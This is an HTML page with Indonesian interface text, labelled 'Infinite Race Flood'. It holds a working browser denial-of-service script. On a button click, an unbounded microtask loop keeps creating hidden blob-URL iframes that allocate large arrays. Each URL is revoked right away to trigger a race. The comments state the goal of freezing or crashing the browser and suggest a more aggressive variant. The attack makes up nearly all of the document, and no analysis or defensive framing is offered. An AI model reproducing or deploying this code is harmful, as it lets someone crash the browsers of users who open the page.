<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Infinite Race Flood</title>
<style>
  body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
  #status { font-size: 20px; font-weight: bold; margin-bottom: 20px; color: #ff0; }
  #log { height: 300px; overflow-y: auto; border: 1px solid #333; padding: 10px; font-size: 12px; }
  .danger { color: #f00; }
  .ok { color: #0f0; }
</style>
</head>
<body>
<h1>💀 INFINITE RACE FLOOD</h1>
<div id="status">Menunggu perintah...</div>
<button id="startBtn" style="padding:15px; font-size:18px; background:red; color:white; border:none; cursor:pointer;">🔥 MULAI FLOODING</button>
<div id="log"></div>

<script>
const statusEl = document.getElementById('status');
const logEl = document.getElementById('log');
let isRunning = false;
let counter = 0;

function log(msg, isDanger) {
    const div = document.createElement('div');
    div.className = isDanger ? 'danger' : 'ok';
    div.textContent = `[${new Date().toISOString().substr(11, 8)}] ${msg}`;
    logEl.appendChild(div);
    // Batasi log agar tidak memakan memori (hanya simpan 100 log terakhir)
    if (logEl.childNodes.length > 100) {
        logEl.removeChild(logEl.firstChild);
    }
    logEl.scrollTop = logEl.scrollHeight;
}

// ============================================
// INFINITE LOOP FLOODING FUNCTION
// ============================================
function startInfiniteFlood() {
    if (isRunning) return;
    isRunning = true;
    statusEl.textContent = "🔥 FLOODING BERJALAN... JANGAN TUTUP TAB!";
    statusEl.style.color = "#f00";

    // Payload HTML berat (untuk memperlambat render & memicu memory leak)
    const heavyHTML = `
        <!DOCTYPE html>
        <html>
        <body>
        <script>
            // Loop alokasi memori di dalam iframe
            let arr = [];
            for(let i=0; i<10000; i++) {
                arr.push(new Array(1000).fill('X'));
            }
            // Kirim sinyal balik ke parent jika berhasil
            try { parent.postMessage('LOADED', '*'); } catch(e) {}
        <\/script>
        </body>
        </html>
    `;

    const blob = new Blob([heavyHTML], { type: 'text/html' });

    // FUNGSI REKURSIF YANG DIPANGGIL TERUS MENERUS
    function flood() {
        if (!isRunning) return;

        try {
            counter++;
            const url = URL.createObjectURL(blob);
            
            // Buat iframe
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            
            // Set src (navigasi)
            iframe.src = url;
            document.body.appendChild(iframe);

            // RACE CONDITION: Revoke instan tanpa menunggu load
            // Kita gunakan setTimeout 0 agar berada di tick berikutnya (microtask queue)
            setTimeout(() => {
                URL.revokeObjectURL(url);
                // Hapus iframe dari DOM agar garbage collector bekerja
                if (iframe.parentNode) {
                    iframe.parentNode.removeChild(iframe);
                }
            }, 0);

            // Log setiap 1000 iterasi agar tidak terlalu membebani UI
            if (counter % 1000 === 0) {
                statusEl.textContent = `🔥 Total Flooding: ${counter} | Membuat browser crash...`;
                log(`Telah memicu ${counter} race condition (iframe + revoke)`, false);
            }

        } catch (e) {
            log(`Error pada iterasi ${counter}: ${e.message}`, true);
        }

        // PANGGIL LAGI SECARA INSTAN (Infinite Loop tanpa jeda)
        // Menggunakan queueMicrotask agar tidak memblokir total event loop utama
        // tapi tetap membanjiri memory dan task queue.
        queueMicrotask(flood);
        
        // ALTERNATIF: Jika ingin lebih agresif dan langsung freeze, hapus queueMicrotask 
        // dan panggil flood() langsung (tapi UI akan freeze total).
        // flood(); 
    }

    flood();
}

// ============================================
// TRIGGER
// ============================================
document.getElementById('startBtn').addEventListener('click', () => {
    log("PERINGATAN: Browser akan freeze/crash!", true);
    startInfiniteFlood();
});
</script>
</body>
</html>
